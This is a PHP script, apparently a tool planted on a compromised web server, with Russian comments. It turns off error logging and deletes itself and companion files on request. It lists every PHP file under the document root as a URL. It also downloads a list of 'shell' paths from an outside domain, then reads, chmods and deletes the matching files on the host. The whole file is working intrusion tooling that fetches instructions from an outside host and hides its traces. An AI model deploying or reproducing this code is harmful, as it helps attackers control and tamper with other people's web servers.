<?
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
ini_set('display_errors', 0);
error_reporting(0);
ignore_user_abort(true);

if (isset($_GET['del']))
{
	if (file_exists('all_php_files.txt'))
		unlink('all_php_files.txt');
	if (file_exists('php_finder.php'))
		unlink('php_finder.php');
	if (file_exists('phpfinder.php'))
		unlink('phpfinder.php');
	if (file_exists('a.php'))
		unlink('a.php');
	exit;
}

function only_read($file_name)
{
	if (file_exists($file_name) and (filesize($file_name)>1))
	{
		$file = fopen($file_name,"rt");
		$original_file = fread($file,filesize($file_name));
		fclose($file);
	}
	return $original_file;
}

function read_file($file_name)
{
	if (file_exists($file_name) and (filesize($file_name)>1))
	{
		$file = fopen($file_name,"rt");
		$arr_file = explode("\n",fread($file,filesize($file_name)));
		fclose($file);
	}
	else
		$arr_file = array();
	
	return $arr_file;
}

$arr_filename = array();

function findshells($start) 
{
	global $arr_filename;
	$files = array();
	$handle = opendir($start);					// Открываем начиная с папки (по умолчанию всегда с корня)
	while(($file=readdir($handle))!==false) 	// Читаем дирректорию с файлами и папками
	{	
		if ($file!="." && $file !="..") 
		{
			$startfile = $start."/".$file;
			if (is_dir($startfile)) 
				findshells($startfile);			// Для каждой найденной папки повторяем действие этой же функции (ищем шеллы) и так со всеми вложенными папками
			else 
			{
				$result = stristr($startfile, '.php');
				if ($result != false)
					$arr_filename[] = $startfile;
			}
		}
	}
	closedir($handle);
	return $arr_filename;
}

echo '<td><hr><hr>';
if (isset($_GET['all_php']))
{
	$arr_php_file = findshells($_SERVER['DOCUMENT_ROOT']);

	foreach ($arr_php_file as $each)
	{
		$each = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $each);
		$each = 'http://'.$each."\n";
		echo $each.'<br>';
	}
}

if (isset($_GET['sh_find']))
{
	$arr_have_sh = array();
	$root = $_SERVER['DOCUMENT_ROOT'];
	
	$link = 'http://africanarrowlogistics.com/components/com_weblinks/2/sh_path.txt';
	$filename = 'sh_path.txt';
	if (!copy($link, $filename)) 
	{
		$arr_path = file_get_contents($link);
		if (($arr_path !== "") and ($arr_path !== " ") and ($arr_path !== null))
			$arr_path = explode("\n", $arr_path);
		else
		{
			$ch = curl_init($link);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			  
			$data = curl_exec($ch);
			curl_close($ch);
			  
			file_put_contents($filename, $data);
			
			if (file_exists($filename))
				$arr_path = read_file($filename);
		}
	}
	else
		$arr_path = read_file($filename);

	foreach ($arr_path as $each)
	{
		$each = trim($each);
		
		$search_str = $_SERVER['SERVER_NAME'];
		
		$result = stristr($each, $search_str);
		if ($result != false)
		{
			$each = str_replace($search_str, $root, $each);
			$arr_have_sh[] = $each;
		}
			
	}
	
	foreach ($arr_have_sh as $each_sh_path)
	{
		if (file_exists($each_sh_path))
		{
			$echo = only_read($each_sh_path);
			echo $echo;
			chmod($each_sh_path, 0777);
			unlink($each_sh_path);
		}
	}
	
	if (file_exists($filename))
		unlink($filename);
}

echo '<hr><hr></td>';
?> 